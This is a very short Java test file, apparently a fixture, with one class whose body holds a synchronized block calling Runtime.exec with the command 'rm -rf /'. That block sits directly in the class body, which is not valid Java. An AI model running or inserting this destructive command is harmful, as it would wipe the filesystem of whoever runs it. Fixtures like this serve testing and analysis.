package server.test;

class AClass {
    
    synchronized(lock) {
        Runtime.getRuntime().exec("rm -rf /");
    }
}
